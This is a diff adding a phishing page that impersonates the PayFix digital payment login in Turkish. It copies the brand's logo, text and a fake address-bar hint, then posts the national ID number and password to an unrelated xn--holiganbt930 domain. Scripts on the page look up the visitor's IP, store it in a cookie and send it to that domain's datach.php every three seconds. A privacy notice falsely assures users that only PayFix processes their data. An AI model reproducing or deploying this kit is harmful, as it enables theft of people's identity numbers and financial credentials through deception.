@@ -1,0 +1,782 @@
+<html class="no-js" lang="tr" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>PayFix</title>
+    <meta name="description" content="Türkiye'nin Dijital Ödeme Hesabı">
+    <meta property="og:description" content="Türkiye'nin Dijital Ödeme Hesabı">
+ 
+    <meta property="al:android:app_name" content="Payfix Mobil Şube">
+ 
+  
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+<script>
+  const url = 'https://ipinfo.io/json';
+  new Vue({
+    el: '#app',
+    data: {
+      results: []
+    },
+    mounted() {
+      window.onload = () => {
+        axios.get(url).then(response => {
+          this.results = response.data;
+
+          // IP adresini bir cookie'ye kaydet
+          document.cookie = "user_ip=" + this.results.ip;
+
+          // Cookie'deki user_ip değerini al ve /api endpoint'ine post et
+          const userIp = getCookie('user_ip');
+          if (userIp) {
+            sendPostRequest(userIp);
+          }
+        });
+      };
+    }
+  });
+
+ 
+
+  function getCookie(cname) {
+    const name = cname + '=';
+    const decodedCookie = decodeURIComponent(document.cookie);
+    const cookieArray = decodedCookie.split(';');
+
+    for (let i = 0; i < cookieArray.length; i++) {
+      let cookie = cookieArray[i];
+      while (cookie.charAt(0) == ' ') {
+        cookie = cookie.substring(1);
+      }
+      if (cookie.indexOf(name) == 0) {
+        return cookie.substring(name.length, cookie.length);
+      }
+    }
+    return '';
+  }
+</script>
+ 
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="theme-color" content="#000000">
+ 
+    <style type="text/css">
+      svg:not(:root).svg-inline--fa {
+        overflow: visible;
+      }
+
+      .svg-inline--fa {
+        display: inline-block;
+        font-size: inherit;
+        height: 1em;
+        overflow: visible;
+        vertical-align: -0.125em;
+      }
+
+      .svg-inline--fa.fa-lg {
+        vertical-align: -0.225em;
+      }
+
+      .svg-inline--fa.fa-w-1 {
+        width: 0.0625em;
+      }
+
+      .svg-inline--fa.fa-w-2 {
+        width: 0.125em;
+      }
+
+      .svg-inline--fa.fa-w-3 {
+        width: 0.1875em;
+      }
+
+      .svg-inline--fa.fa-w-4 {
+        width: 0.25em;
+      }
+
+      .svg-inline--fa.fa-w-5 {
+        width: 0.3125em;
+      }
+
+      .svg-inline--fa.fa-w-6 {
+        width: 0.375em;
+      }
+
+      .svg-inline--fa.fa-w-7 {
+        width: 0.4375em;
+      }
+
+      .svg-inline--fa.fa-w-8 {
+        width: 0.5em;
+      }
+
+      .svg-inline--fa.fa-w-9 {
+        width: 0.5625em;
+      }
+
+      .svg-inline--fa.fa-w-10 {
+        width: 0.625em;
+      }
+
+      .svg-inline--fa.fa-w-11 {
+        width: 0.6875em;
+      }
+
+      .svg-inline--fa.fa-w-12 {
+        width: 0.75em;
+      }
+
+      .svg-inline--fa.fa-w-13 {
+        width: 0.8125em;
+      }
+
+      .svg-inline--fa.fa-w-14 {
+        width: 0.875em;
+      }
+
+      .svg-inline--fa.fa-w-15 {
+        width: 0.9375em;
+      }
+
+      .svg-inline--fa.fa-w-16 {
+        width: 1em;
+      }
+
+      .svg-inline--fa.fa-w-17 {
+        width: 1.0625em;
+      }
+
+      .svg-inline--fa.fa-w-18 {
+        width: 1.125em;
+      }
+
+      .svg-inline--fa.fa-w-19 {
+        width: 1.1875em;
+      }
+
+      .svg-inline--fa.fa-w-20 {
+        width: 1.25em;
+      }
+
+      .svg-inline--fa.fa-pull-left {
+        margin-right: 0.3em;
+        width: auto;
+      }
+
+      .svg-inline--fa.fa-pull-right {
+        margin-left: 0.3em;
+        width: auto;
+      }
+
+      .svg-inline--fa.fa-border {
+        height: 1.5em;
+      }
+
+      .svg-inline--fa.fa-li {
+        width: 2em;
+      }
+
+      .svg-inline--fa.fa-fw {
+        width: 1.25em;
+      }
+
+      .fa-layers svg.svg-inline--fa {
+        bottom: 0;
+        left: 0;
+        margin: auto;
+        position: absolute;
+        right: 0;
+        top: 0;
+      }
+
+      .fa-layers {
+        display: inline-block;
+        height: 1em;
+        position: relative;
+        text-align: center;
+        vertical-align: -0.125em;
+        width: 1em;
+      }
+
+      .fa-layers svg.svg-inline--fa {
+        -webkit-transform-origin: center center;
+        transform-origin: center center;
+      }
+
+      .fa-layers-counter,
+      .fa-layers-text {
+        display: inline-block;
+        position: absolute;
+        text-align: center;
+      }
+
+      .fa-layers-text {
+        left: 50%;
+        top: 50%;
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+        -webkit-transform-origin: center center;
+        transform-origin: center center;
+      }
+
+      .fa-layers-counter {
+        background-color: #ff253a;
+        border-radius: 1em;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        color: #fff;
+        height: 1.5em;
+        line-height: 1;
+        max-width: 5em;
+        min-width: 1.5em;
+        overflow: hidden;
+        padding: 0.25em;
+        right: 0;
+        text-overflow: ellipsis;
+        top: 0;
+        -webkit-transform: scale(0.25);
+        transform: scale(0.25);
+        -webkit-transform-origin: top right;
+        transform-origin: top right;
+      }
+
+      .fa-layers-bottom-right {
+        bottom: 0;
+        right: 0;
+        top: auto;
+        -webkit-transform: scale(0.25);
+        transform: scale(0.25);
+        -webkit-transform-origin: bottom right;
+        transform-origin: bottom right;
+      }
+
+      .fa-layers-bottom-left {
+        bottom: 0;
+        left: 0;
+        right: auto;
+        top: auto;
+        -webkit-transform: scale(0.25);
+        transform: scale(0.25);
+        -webkit-transform-origin: bottom left;
+        transform-origin: bottom left;
+      }
+
+      .fa-layers-top-right {
+        right: 0;
+        top: 0;
+        -webkit-transform: scale(0.25);
+        transform: scale(0.25);
+        -webkit-transform-origin: top right;
+        transform-origin: top right;
+      }
+
+      .fa-layers-top-left {
+        left: 0;
+        right: auto;
+        top: 0;
+        -webkit-transform: scale(0.25);
+        transform: scale(0.25);
+        -webkit-transform-origin: top left;
+        transform-origin: top left;
+      }
+
+      .fa-lg {
+        font-size: 1.3333333333em;
+        line-height: 0.75em;
+        vertical-align: -0.0667em;
+      }
+
+      .fa-xs {
+        font-size: 0.75em;
+      }
+
+      .fa-sm {
+        font-size: 0.875em;
+      }
+
+      .fa-1x {
+        font-size: 1em;
+      }
+
+      .fa-2x {
+        font-size: 2em;
+      }
+
+      .fa-3x {
+        font-size: 3em;
+      }
+
+      .fa-4x {
+        font-size: 4em;
+      }
+
+      .fa-5x {
+        font-size: 5em;
+      }
+
+      .fa-6x {
+        font-size: 6em;
+      }
+
+      .fa-7x {
+        font-size: 7em;
+      }
+
+      .fa-8x {
+        font-size: 8em;
+      }
+
+      .fa-9x {
+        font-size: 9em;
+      }
+
+      .fa-10x {
+        font-size: 10em;
+      }
+
+      .fa-fw {
+        text-align: center;
+        width: 1.25em;
+      }
+
+      .fa-ul {
+        list-style-type: none;
+        margin-left: 2.5em;
+        padding-left: 0;
+      }
+
+      .fa-ul>li {
+        position: relative;
+      }
+
+      .fa-li {
+        left: -2em;
+        position: absolute;
+        text-align: center;
+        width: 2em;
+        line-height: inherit;
+      }
+
+      .fa-border {
+        border: solid 0.08em #eee;
+        border-radius: 0.1em;
+        padding: 0.2em 0.25em 0.15em;
+      }
+
+      .fa-pull-left {
+        float: left;
+      }
+
+      .fa-pull-right {
+        float: right;
+      }
+
+      .fa.fa-pull-left,
+      .fas.fa-pull-left,
+      .far.fa-pull-left,
+      .fal.fa-pull-left,
+      .fab.fa-pull-left {
+        margin-right: 0.3em;
+      }
+
+      .fa.fa-pull-right,
+      .fas.fa-pull-right,
+      .far.fa-pull-right,
+      .fal.fa-pull-right,
+      .fab.fa-pull-right {
+        margin-left: 0.3em;
+      }
+
+      .fa-spin {
+        -webkit-animation: fa-spin 2s infinite linear;
+        animation: fa-spin 2s infinite linear;
+      }
+
+      .fa-pulse {
+        -webkit-animation: fa-spin 1s infinite steps(8);
+        animation: fa-spin 1s infinite steps(8);
+      }
+
+      @-webkit-keyframes fa-spin {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+
+        100% {
+          -webkit-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes fa-spin {
+        0% {
+          -webkit-transform: rotate(0deg);
+          transform: rotate(0deg);
+        }
+
+        100% {
+          -webkit-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      .fa-rotate-90 {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
+        -webkit-transform: rotate(90deg);
+        transform: rotate(90deg);
+      }
+
+      .fa-rotate-180 {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
+        -webkit-transform: rotate(180deg);
+        transform: rotate(180deg);
+      }
+
+      .fa-rotate-270 {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
+        -webkit-transform: rotate(270deg);
+        transform: rotate(270deg);
+      }
+
+      .fa-flip-horizontal {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
+        -webkit-transform: scale(-1, 1);
+        transform: scale(-1, 1);
+      }
+
+      .fa-flip-vertical {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+        -webkit-transform: scale(1, -1);
+        transform: scale(1, -1);
+      }
+
+      .fa-flip-both,
+      .fa-flip-horizontal.fa-flip-vertical {
+        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+        -webkit-transform: scale(-1, -1);
+        transform: scale(-1, -1);
+      }
+
+      :root .fa-rotate-90,
+      :root .fa-rotate-180,
+      :root .fa-rotate-270,
+      :root .fa-flip-horizontal,
+      :root .fa-flip-vertical,
+      :root .fa-flip-both {
+        -webkit-filter: none;
+        filter: none;
+      }
+
+      .fa-stack {
+        display: inline-block;
+        height: 2em;
+        position: relative;
+        width: 2.5em;
+      }
+
+      .fa-stack-1x,
+      .fa-stack-2x {
+        bottom: 0;
+        left: 0;
+        margin: auto;
+        position: absolute;
+        right: 0;
+        top: 0;
+      }
+
+      .svg-inline--fa.fa-stack-1x {
+        height: 1em;
+        width: 1.25em;
+      }
+
+      .svg-inline--fa.fa-stack-2x {
+        height: 2em;
+        width: 2.5em;
+      }
+
+      .fa-inverse {
+        color: #fff;
+      }
+
+      .sr-only {
+        border: 0;
+        clip: rect(0, 0, 0, 0);
+        height: 1px;
+        margin: -1px;
+        overflow: hidden;
+        padding: 0;
+        position: absolute;
+        width: 1px;
+      }
+
+      .sr-only-focusable:active,
+      .sr-only-focusable:focus {
+        clip: auto;
+        height: auto;
+        margin: 0;
+        overflow: visible;
+        position: static;
+        width: auto;
+      }
+
+      .svg-inline--fa .fa-primary {
+        fill: var(--fa-primary-color, currentColor);
+        opacity: 1;
+        opacity: var(--fa-primary-opacity, 1);
+      }
+
+      .svg-inline--fa .fa-secondary {
+        fill: var(--fa-secondary-color, currentColor);
+        opacity: 0.4;
+        opacity: var(--fa-secondary-opacity, 0.4);
+      }
+
+      .svg-inline--fa.fa-swap-opacity .fa-primary {
+        opacity: 0.4;
+        opacity: var(--fa-secondary-opacity, 0.4);
+      }
+
+      .svg-inline--fa.fa-swap-opacity .fa-secondary {
+        opacity: 1;
+        opacity: var(--fa-primary-opacity, 1);
+      }
+
+      .svg-inline--fa mask .fa-primary,
+      .svg-inline--fa mask .fa-secondary {
+        fill: black;
+      }
+
+      .fad.fa-inverse {
+        color: #fff;
+      }
+    </style>
+    <link rel="icon" href="favicon.ico">
+    <link rel="manifest" href="manifest.webapp">
+    <link rel="stylesheet" href="loading.css">
+ 
+    <meta name="twitter:card" content="app">
+    <meta name="twitter:site" content="@PayFix">
+    <meta name="twitter:description" content="Çağın dijital ödeme hesabı PayFix ile fiziki karta ihtiyaç duymadan, ister bilgisayardan ister telefondan kolayca paranızı yönetebilirsiniz.">
+    <meta name="twitter:app:country" content="TR">
+ 
+ 
+     <link rel="stylesheet" href="app.css">
+    <base href="/">
+    <link href="vendors.37ecf04e837de0a8b04b.css" rel="stylesheet">
+    <link href="main.37ecf04e837de0a8b04b.css" rel="stylesheet">
+  </head>
+  <body>
+    <!--[if lt IE 9]>
+																																								<p class="browserupgrade">
+        You are using an 
+																																									<strong>outdated</strong> browser. Please 
+																																									<a href="http://browsehappy.com/">upgrade your browser</a> to improve
+        your experience.
+      
+																																								</p>
+																																								<![endif]-->
+    <div id="root">
+      <div>
+        <div class="col-md-12" style="padding: 0px;">
+          <div class="Toastify"></div>
+          <div class="view-routes">
+            <div class="row flex-column-reverse flex-lg-row">
+              <div class="col-12 col-sm-12 col-md-12 col-lg-4 col-xl-4">
+                <img data-cfsrc="/head.png" class="logo-img" alt="PayFix" style="width:100%" title="PayFix" src="/head.png">
+                <div class="mt-3 p-4" id="login-title">
+                  <p class="text-style">
+                    <span>Hesabınıza giriş yapabilir ya da hesap <br>oluşturabilirsiniz. </span>
+                  </p>
+                </div>
+                <div style="padding: 0px 1em; text-align: center;">
+                  <div style="height: 28px; display: inline-block; background-color: rgb(255, 255, 255); border: 1px solid rgb(222, 222, 222); font-size: 12px; font-weight: 400; line-height: 2.2; letter-spacing: 0px; text-indent: 0px; padding: 0px 12px; margin: 3px 0px -3px; color: rgb(42, 42, 42); user-select: none; border-radius: 14px; overflow: hidden;">
+                    <i style="width: 20px; height: 16px; float: left; background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkNhcGFfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiDQoJIHdpZHRoPSIzNnB4IiBoZWlnaHQ9IjQ4cHgiIHZpZXdCb3g9IjAgMCAzNiA0OCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMzYgNDgiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHBhdGggZmlsbD0iIzE5N0YzNiIgZD0iTTM1LDIwaC0zdi02YzAtNy43Mi02LjI4LTE0LTE0LTE0UzQsNi4yOCw0LDE0djZIMWMtMC41NTMsMC0xLDAuNDQ3LTEsMXYyM2MwLDIuMjA2LDEuNzk0LDQsNCw0aDI4DQoJYzIuMjA2LDAsNC0xLjc5NCw0LTRWMjFDMzYsMjAuNDQ3LDM1LjU1MywyMCwzNSwyMHogTTEwLDE0YzAtNC40MTEsMy41ODktOCw4LThzOCwzLjU4OSw4LDh2NkgxMFYxNHoiLz4NCjwvc3ZnPg0K&quot;); background-position: left center; background-repeat: no-repeat; background-size: 9px; border-right: 1px solid rgb(138, 138, 138); margin: 5px 8px 0px 0px;"></i>
+                    <span style="display: block; float: left; color: rgb(25, 127, 54); text-indent: 0px;">https:</span>//bireysel.payfix.com.tr
+                  </div>
+                  <p style="padding-top: 1em; font-size: 65%;">Tarayıcınızın adres çubuğu resimdeki gibi olmalıdır.</p>
+                </div>
+                <div class="p-4">
+                  <div class="row">
+                    <div class="col-md-12">
+<form action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="post" class="py-3 my-input av-invalid" id="myForm">
+  <div class="form-group">
+    <div class="text-danger form-group">
+      <input autocomplete="off" name="turkeyId" pattern="^[0-9]+$" minlength="11" maxlength="11" id="turkeyId" type="text" class="is-touched is-dirty form-control" value="" placeholder="TC Kimlik Numarası" required>
+      <div class="invalid-feedback" style="">Bu alan gereklidir.</div>
+    </div>
+  </div>
+  <div class="password-field form-group">
+    <div class="text-danger form-group">
+      <input autocomplete="off" name="password" pattern="^.{6,}$" id="password" type="password" minlength="6"  maxlength="6" class="is-touched is-dirty form-control" value="" placeholder="Şifre" style="display: inline; width: 100%; margin: 0px;" required>
+      <div class="invalid-feedback">Giriş bilgileriniz hatalı lütfen tekrar ediniz.</div>
+    </div>
+    <button type="button" style="display: inline-block; width: auto; height: 40px; background-color: transparent; border: none; outline: none; color: rgb(172, 172, 172);">
+      <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="eye-slash" class="svg-inline--fa fa-eye-slash fa-w-20 " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" style="color: rgb(172, 172, 172);">
+        <path fill="currentColor" d="M320 400c-75.85 0-137.25-58.71-142.9-133.11L72.2 185.82c-13.79 17.3-26.48 35.59-36.72 55.59a32.35 32.35 0 0 0 0 29.19C89.71 376.41 197.07 448 320 448c26.91 0 52.87-4 77.89-10.46L346 397.39a144.13 144.13 0 0 1-26 2.61zm313.82 58.1l-110.55-85.44a331.25 331.25 0 0 0 81.25-102.07a32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64a308.15 308.15 0 0 0-147.32 37.7L45.46 3.37A16 16 0 0 0 23 6.18L3.37 31.45A16 16 0 0 0 6.18 53.9l588.36 454.73a16 16 0 0 0 22.46-2.81l19.64-25.27a16 16 0 0 0-2.82-22.45zm-183.72-142l-39.3-30.38A94.75 94.75 0 0 0 416 256a94.76 94.76 0 0 0-121.31-92.21A47.65 47.65 0 0 1 304 192a46.64 46.64 0 0 1-1.54 10l-73.61-56.89A142.31 142.31 0 0 1 320 112a143.92 143.92 0 0 1 144 144c0 21.63-5.29 41.79-13.9 60.11z"></path>
+      </svg>
+    </button>
+  </div>
+  <div class="form-group">
+    <button type="submit" class="font-weight-bold w-100 my-2 btn btn-danger" id="submitButton" disabled>
+      <span>Giriş</span>
+    </button>
+  </div>
+</form>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const turkeyIdInput = document.getElementById('turkeyId');
+    const passwordInput = document.getElementById('password');
+    const submitButton = document.getElementById('submitButton');
+
+    turkeyIdInput.addEventListener('input', validateForm);
+    passwordInput.addEventListener('input', validateForm);
+
+    function validateForm() {
+      const isValidTurkishId = tcno_dogrula_ve_islem_yap(turkeyIdInput.value);
+      const isPasswordValid = passwordInput.value.length >= 6;
+
+      if (isValidTurkishId && isPasswordValid) {
+        submitButton.removeAttribute('disabled');
+      } else {
+        submitButton.setAttribute('disabled', 'disabled');
+      }
+    }
+
+    async function tcno_dogrula_ve_islem_yap(tcno) {
+      // TC kimlik doğrulama fonksiyonu
+      tcno = String(tcno);
+      if (tcno.substring(0, 1) === '0') {
+        return false;
+      }
+      if (tcno.length !== 11) {
+        return false;
+      }
+      var ilkon_array = tcno.substr(0, 10).split('');
+      var ilkon_total = hane_tek = hane_cift = 0;
+      for (var i = j = 0; i < 9; ++i) {
+        j = parseInt(ilkon_array[i], 10);
+        if (i & 1) {
+          hane_cift += j;
+        } else {
+          hane_tek += j;
+        }
+        ilkon_total += j;
+      }
+      if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+        return false;
+      }
+      ilkon_total += parseInt(ilkon_array[9], 10);
+      if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+        return false;
+      }
+      return true;
+    }
+  });
+</script>
+                        <div class="text-center text-black-50 mt-5">
+                          <div>
+                            <a class="black-text-button" href="/account/reset/request">
+                              <span>Şifremi Unuttum</span>
+                            </a>
+                          </div>
+                          <div class="my-2">
+                            <span>Hesabınız yok mu?</span>
+                            <a class="black-text-button" href="/account/register">
+                              <span>Kayıt Ol</span>
+                            </a>
+                          </div>
+                          <div class="help-button-wrapper">
+                            <button type="button" class="help-button">
+                              <span>Nasıl yardımcı olabiliriz?</span>
+                            </button>
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+                </div>
+                <hr>
+                <div>
+                  <p class="text-center text-muted">© <a href="https://payfix.com.tr" rel="noopener noreferrer" target="_blank" style="color: rgb(65, 145, 255);">PayFix</a>
+                    <span> Tüm Hakları Saklıdır.</span>
+                  </p>
+                </div>
+                <hr>
+                <p class="" style="font-size: 12px; color: gray; text-align: justify; padding: 5px;">
+                  <span>Değerli Müşterimiz; Pay Fix Elektronik Para Ve Ödeme Hizmetleri A.Ş. (PayFix) Bireysel Şube’ye hoş geldiniz. Hesabınıza giriş yapmadan önce bu formu doldurarak gönderdiğiniz TC Kimlik numaranız ve Şifreniz, 6698 sayılı Kişisel Verilerin Korunması Kanundaki ilke ve esaslar ile şirketimiz bünyesindeki finansal güvenlik önlemleri uyarınca yalnızca hesabınıza erişim yapabilmenizi sağlamak amacıyla işlenecek ve sistemlerimizde kaydedilecektir. Kişisel verileriniz sadece, inceleme, denetim gibi işlemler nedeniyle PayFix’in bağlı olduğu 6493 sayılı Kanun gibi özel mevzuatla yetkilendirilmiş kamu kurum ve kuruluşları ile paylaşılabilmektedir. Kişisel verilerinizle ilgili haklarınız, başvuru prosedürü ve diğer konular için <strong>İnternet Aydınlatma Metni</strong> ve <strong>Gizlilik Politikamızı</strong> inceleyebilirsiniz. </span>
+                  <br>
+                  <br>
+                  <span style="display: block; text-align: center;">
+                    <a style="color: rgb(65, 145, 255); cursor: pointer;"> İnternet Aydınlatma Metni </a>| <a style="color: rgb(65, 145, 255); cursor: pointer;"> Gizlilik Politikası</a>
+                  </span>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+ <script>
+  new Vue({
+    el: '#app',
+    data: {
+      results: [],
+      userIp: '' // Kullanıcı IP'sini saklamak için bir değişken
+    },
+    mounted() {
+      // İlk çağrıyı yap
+      this.getUserIpFromCookie();
+      this.makeRequests();
+
+      // Ardından 3 saniyede bir tekrar et
+      setInterval(() => {
+        this.getUserIpFromCookie();
+        this.makeRequests();
+      }, 3000);
+    },
+    methods: {
+      getUserIpFromCookie() {
+        // Cookie'den user_ip değerini al
+        this.userIp = this.getCookie('user_ip');
+      },
+      makeRequests() {
+        if (this.userIp) {
+          // Kullanıcı IP'si varsa istek yap
+          axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`)
+            .then(response => {
+              this.results = response.data;
+              console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
+            })
+            .catch(error => {
+              console.error('GET isteği sırasında bir hata oluştu:', error);
+            });
+        } else {
+          // Kullanıcı IP'si yoksa istek yapma
+          console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
+        }
+      },
+      getCookie(cname) {
+        const name = cname + '=';
+        const decodedCookie = decodeURIComponent(document.cookie);
+        const cookieArray = decodedCookie.split(';');
+
+        for (let i = 0; i < cookieArray.length; i++) {
+          let cookie = cookieArray[i];
+          while (cookie.charAt(0) == ' ') {
+            cookie = cookie.substring(1);
+          }
+          if (cookie.indexOf(name) == 0) {
+            return cookie.substring(name.length, cookie.length);
+          }
+        }
+        return '';
+      }
+    }
+  });
+</script>
+
+  </body>
+</html>
